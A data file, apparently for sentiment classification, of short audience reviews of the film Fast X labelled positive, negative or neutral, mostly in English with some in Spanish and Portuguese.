"May 18, 2023",NEGATIVE,"Dead long time ago, nothing more to it. Repetetive."
"May 18, 2023",NEGATIVE,"La película esta masomenos, solo una carrera y no se termina completa ademas mucha ficción! 
La verdad espere mucho más de esta película, les recomiendo no verla en el cine no se pierden de mucho. 
Ojalá regresenas películas de carreras"
"May 18, 2023",NEUTRAL,"these are the masters of car crashing fight scenes, destruction to an art form, leaves we --how did they film that one?  the new villion ads comic relief.  i do think there should be a rule: actions movies have to be less than 2 hours... all and all an enjoyable flick, left me eager for the next/last one"
"May 18, 2023",POSITIVE,"Fast X is the best Fast and Furious since Furious 7. Jason Momoa is incredible and really makes this movie for what it is. And yeah, some parts were a bit fiction, but in f9 they went to space. In Furious 7 they jumped from building to building, so I really don't mind. I had a fantastic time in the theater."
"May 18, 2023",NEGATIVE,Looks like a cheap action movie. With to many action stars in it.
"May 18, 2023",POSITIVE,"One of the greatest movies of the franchise. It had everything. It had comedy that hit at the right point, emotional at each corner and it always kept you on your toes with the action that it had. I cannot wait for the next one( also great cars as always)."
"May 18, 2023",NEGATIVE,"Very weird movie, it was all over the place. I loved the past fast movies but this one seemed like a parity of the franchise."
"May 18, 2023",POSITIVE,"Excellent, action packed, love the villain plus the mid credit scene brought me shock, twice (in a good way though). This is exactly what we expected to get when we bought the tickets, can't wait for the next one."
"May 18, 2023",NEGATIVE,This movie franchise ended long time ago🚶🚶
"May 18, 2023",NEUTRAL,"I watched the movie with my wife, and I watched the movie because of my wife. She is a fan of Vin Diesel as well as the FF franchise.

From my point of view the movie is ok, entertaining popcorn cinema. But nothing more. The plot is almost non-existent, the dialogues try to dance limbo. The action scenes are far from any realism, but that's what you'd expect.

You will be entertained."
"May 18, 2023",NEUTRAL,"I suck at suspending disbelief in movies with bad storylines, but I have to say, the simple plot of Dante, played EXCELLENTLY by Jason Momoa, wanting revenge and suffering on Dom, worked for me. I laughed SO MUCH at this movie: it was fun, entertaining, and I felt my heart beating multiple times in the movie. I liked too that they separated ""the family"" and allowed for at least four simultaneous storylines to run at any given time, which also worked for me. Some of the stunts the whole theater laughed at, but there were a few moments where our jaws were on the floor. We were entertained for sure, which is why I would recommend this."
"May 18, 2023",NEGATIVE,"The Fast X movie is a complete and utter mess. It's overlong, over-the-top, and completely ridiculous. The plot is nonsensical, the characters are one-dimensional, and the action sequences are boring and predictable.

If you're a fan of the Fast & Furious franchise, you'll probably find something to enjoy in Fast X. But if you're looking for a good movie, you'll be disappointed."
"May 18, 2023",POSITIVE,La mejor película que he visto
"May 18, 2023",NEUTRAL,"While I was excited to see the movie, I love the cast and will continue to support. Three Stars."
"May 18, 2023",NEGATIVE,I can't believe the ridiculous scenes that this installment has... basically one surpasses the other in fiction.
"May 18, 2023",POSITIVE,"Fast x was certainly surprising. Jason Momoa was the best villain in the whole franchise his psychotic way were well 😁 funny. The movie this time focused less on family more on Dom.But I am giving the movie a five star for the revelation in the end. Loved it, guess Han's gotta remove his dating profile 🤭🤭. But the movie was 100 times better than the last movie."
"May 18, 2023",POSITIVE,Everyone knows this is a ridiculous plot but ppl love this crazy franchise and dom's family no matter what anyone says lol I also think Fast X(fast and furious10) is way better than 8&9
"May 18, 2023",NEGATIVE,"This Saga should have ended with its seventh installment, while it wasn't a constant and ridiculous raving, Paul Waiker's departure should have been Vin Diesel's Goodbye as well. Its only highlight is Jason Momoa's Nero, we've seen the rest, over and over again, but worst."
"May 18, 2023",POSITIVE,"Certainly not the greatest in the Fast and Furious franchise but for those long time fans (like me) there is a lot to love.  Lots of easter eggs to previous films, Jason Momoa is great fun as the new villain.  I liked this better than 8 and 9 and I can't wait to see how they wrap it all up."
"May 18, 2023",NEUTRAL,"Well, family it is but this film isn't as fun as I expected. It is not quite boring but I don't like the plot."
"May 18, 2023",POSITIVE,Best Fast & Furious Movie!
"May 18, 2023",POSITIVE,what do y'all expect? just enjoy the action!!
"May 18, 2023",POSITIVE,"The movie was great, idc what anyone says. It's perfect, the pacing, jason momoa's character, fast 5 conmections, plot twists and the story."
"May 18, 2023",POSITIVE,it's awesome. such a upgrade from fast 9 and the final part of the movie is unexpected and so damn good. curious to see what's going to happen in the next part.
"May 18, 2023",NEGATIVE,Terrible!!!! Ni las Peliculas de Marvel tienen tanta ficción !!!! Es un insulto a las personas que tanto esperaron por esta película !!! Malaaaa muyyy mala !!!!
"May 18, 2023",NEGATIVE,"Simplesmente horrível, atuações engessadas, cenas de luta que não empolga muito mas com uma leve melhora na participação do Jason Statham, piadas péssimas e fora totalmente de contexto com a cena em questão, isso sem citar o roteiro que é precário, pra quem gosta de filme fantasioso, de roteiro e atores que não atuam melhor que um saco se batata esse filme é perfeito para você, caso contrário passe longe."
"May 18, 2023",POSITIVE,"I been watching this franchise since 12 years old where my parent will buy me blu ray and watch at home and i know people will say race car suddenly turn into action but still hey is  good movie to watch, so don't judge by its cover and enjoy while you can which this movie is good and medium in same time so lets say 50-50 in this situation"
"May 18, 2023",POSITIVE,"Longer, faster and better. Fast X is lunatic in a good way. I loved the surprised cameos, OMG, it's the biggest of the franchise. The way it ends reminded me of Infinity War. I want Fast 11 NOW!!!"
"May 18, 2023",POSITIVE,"best movie in the series.
Lots of action and a very good villain."
"May 18, 2023",NEUTRAL,"Family! After how bad #F9 was, my expectations were low, but wow! Really enjoyed #FastX! It knows what it is and it doesn't take itself too serious. Tons of long dragged out action sequences. Scenes that defy the laws of gravity, physics, friction, God and logic. Plenty of humor throughout as well. Jason Momoa's character carries the movie at times; didn't expect such a bad ass flamboyant villain.
Let's be honest, ten movies in if you're not a Fast fan, this won't be the one that wins you over. The movie does drag at times, especially by the third act. It seemed to be more focused on building towards the next movie instead of properly wrapping up this one. Tons of ""loose ends"" to tie up in Fast XI.  Overall, it's a fun time at the movies, grab snacks, a drink and enjoy! There's a mid credits scene too, so stay for that."
"May 18, 2023",POSITIVE,kill john cena in comeback of the rock is the mistake of this movie
"May 18, 2023",POSITIVE,Fast x manages to deliver in some areas while making time to improve for what comes next
"May 17, 2023",NEGATIVE,These movies get further and further out of touch of reality. It's gotten so ridiculous that I forgot the 1st one was about cars. Please stop making these.
"May 17, 2023",POSITIVE,Don't believe the negative reviews! Much more inspired villain in Jason Momoa than the last few films and the best choreographed action since Fast 5 or 6: All adds up to a great Fast film in my book!
"May 17, 2023",POSITIVE,The story and action of the movie of was better then F9 And Fast and furious 8 Might not be better then fast and furious 1-7 but awesome movie and it's also funny
"May 17, 2023",POSITIVE,The greatest 02 hours: and 21 minutes ever!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
"May 17, 2023",POSITIVE,"Momoa as villain is great addition to franchise. It left some Thanos vibe, like in infinity war, first movie was to introduce bad guy, and they did it really well!!!"
"May 17, 2023",POSITIVE,I love the fast and the furious movies
"May 17, 2023",POSITIVE,Yet it's funny how people are complaining about certain things in ten when yet they had the original director back out a week into filming only for lerritor to pick up sometime after that so excuse me and everyone else if that was a hiccup in the making
"May 17, 2023",POSITIVE,"This movie is a great addition to the franchise! I loved it, even though it has some small flaws. The callbacks and jokes were well performed and timed. Great movie!"
"May 17, 2023",NEGATIVE,this saga shoud have ended after movie 6
"May 17, 2023",POSITIVE,"It's fun. It has some bad performances in it, and at no point do you accept the story as representing reality, but it doesn't need you to. It doesn't tell you how to act or what to think and in today's Hollywood, that's a good thing."
"May 17, 2023",POSITIVE,Fun movie. You know what to get out of it so don’t take it serious. Jason Mamoa is great
"May 17, 2023",NEGATIVE,"Waste of time 😒💔 If you love super unrealistic action and family drama this is for you , not for me. Time to leave franchise!"
"May 17, 2023",POSITIVE,"Es una película llena de emociones buenas y tristes que nos dejan con ganas de más de esta fantástica franquicia, y sol es la parte 1 de 3, así que es buena idea que se pongan al día , es necesario Vel la 5ta entrega para poder entender esta bien"
"May 17, 2023",POSITIVE,"Initial skepticism about Jason Momoa's role and the freshness of the tenth installment quickly dissipates as the movie shifts gears. It surpasses the last three movies of the saga thanks to a compelling narrative, action-packed sequences, and moments that will have you exclaiming in disbelief. Jason Momoa's Dante is a refreshing, Joker-esque villain adding new depth to the series. Despite a 141-minute runtime, it races by with popcorn entertainment at its best. Worth the ticket, time, and even addition to your collection, Fast X is full-throttle fun that proves the franchise's ability to reinvent itself while respecting its legacy."
"May 17, 2023",NEUTRAL,"A classic, nothing much newer but a bit of an improvement of Fast 9 there were a few good and negative feelings I had in this film. Although walked out with a smile!"
"May 17, 2023",POSITIVE,BYE CENA DEAD AND WELCOME BACK THE ROCK LOL
"May 17, 2023",NEUTRAL,"With it's over the top action, and surprisingly funny moments you'll never find your self bored watching this film. Jason Momoa absolutely steals the show being one the best villains in the franchise. But the film still has it's fair share of problems. The plot is overstuff, and with some of the fan favorite characters having to take a backseat in this one. Fast X is definitely a step up from the last film."
"May 17, 2023",NEUTRAL,"Just like Top Gun Maverick, this is how popcorn blockbusters should be made! And if Vin Diesel is gonna keep doing other F&F entries as good as F10, I could just have another 10. 👍🏻👍🏻"

"May 17, 2023",NEGATIVE,Total time waste.. Some parts are fun but it's very stupid
"May 17, 2023",POSITIVE,"THIS IS A COMEBACK TO THE FRANCHISE AFTER F9 BEING BORING, JASON MOMOA, CHARACTER, DANTE REYES IS A HEATH LEDGER, JOKER TYPE VILLAIN, AND THE ROCKS POST-CREDIT RETURN WITHOUT HAVING JAKOB TORETTO IN FAST 11 MAY CONCERN FANS, BUT FAST X HAS A PAUL WALKER PRESENT IN A BIG WAY WITHOUT SHOWING HIM AS A CHARACTER BUY AS A REFLECTION~FAMILIES HAVE TO WATCH THIS ON FRIDAY !!"
"May 17, 2023",POSITIVE,"It is amazing how these films can constantly push the boundaries of what's possible regarding vehicular action. Before F9, the Fast franchise needed help finding its identity. Now we know what to expect, and that movie is here to entertain and push the boundaries. It is mind-blowing how no other film franchise has done what this franchise continues to do: recreating additional plot points that never appeared in previous movies. For example, in this installment, Jason Momoa plays the son of Fast Five's antagonist Hernan Reyes, but Momoa never once appeared in that 2011 film. However, not to worry at all. This movie opens up with the film's climax, with Momoa slipping into reshot scenes to set up what this family will face off against.

To my surprise, this movie ups the ante with tons of mind-boggling stunts. You have to go into the movie mindlessly and enjoy what is in front of you. The sooner you turn off your brain, the more of this film you can enjoy. There is the perfect blend of heart-pounding action, humor, charismatic characters, and a strong sense of family. The original cast is great, and everyone gets their moments to shine. Ludacris and Tyrese ragging on each other, Sung Kang getting the munchies, and the ladies Michelle Rodriguez and Jordana Brewster showcasing their fighting skills. Vin Diesel leads this family with the same charm, morality, loyalty, and temperament we have seen since the first film.

John Cena returns and is tasked with protecting Dom's son, played by Leo Abelo Perry. The scenes they share are some of the highlights of the film. Brie Larson and Allan Ritchson are the newest additions to the franchise. However, they are just there to move the plot forward. Finally, the villainous Momoa delivers an unhinged, flamboyant megalomaniac performance and is easily the worst adversary Dom and his family have ever faced.

I give Fast X 4 out of 5 stars. It may be the most ambitious installment to date that may be the beginning of a planned trilogy. James Wan, who stepped away from helming this film, is not missed. Lou Lettier offers his vision, showcasing that he is the man for continuing the franchise as he is a superfan."
"May 17, 2023",POSITIVE,"Filme bem divertido e satisfatório, cenas de ação interruptas. Digno da franquia velozes. Jason Momoa com atuação impecável! Super recomendo…"
"May 17, 2023",NEGATIVE,The only good thing in this Movie was Jason Momoa. I wanted the leave the cinema many times but he at least kept me in.
"May 17, 2023",NEGATIVE,"It's an alright popcorn flick. It has lots of funny scenes and alot of action. Jason Momoa steals the scenes he is in. He's very much  a ""Joker"" like character.  The rest is the same as previous films: Car mayhem, superhero stunts and street fights. The bad: Characters NEVER stay dead. Repetitive storyline from previous films."
"May 17, 2023",POSITIVE,"One of my favorite action franchise movies of all time is Fast and the Furious I Love The Family, and I always love Vin Diesel
#Fast X"
"May 17, 2023",NEGATIVE,It occurs that Momoa did once again all the heavy lifting!!!
"May 17, 2023",POSITIVE,Great movie and great action scenes.
"May 17, 2023",NEUTRAL,"It wasnt bad, the action was cool and all.
My problem is that theres nothing particularly remarkable about it, something to seperate it from the other Fast and Furious movies. 
If you asked me to name everything i remembered from this movie, id only be able to tell you the characters that were there from previous films, the super chip thing, the huge fireball and Jason Momoa.
Seriously tho, even the general story is the same as the previous films. 

Overall, its cool but in terms of uniqueness its basically like iphones these days. Didnt change much from its predecessor"
"May 17, 2023",POSITIVE,"Pretty good, there are some plot twists, actions like Call of Duty, brilliant jokes from dynamic duo(tej n Roman) and last but not least for someone who miss the drag race. The fuckin antagonist is also crazy asf."
"May 17, 2023",POSITIVE,It was a pretty good movie I enjoyed the racing and action scenes
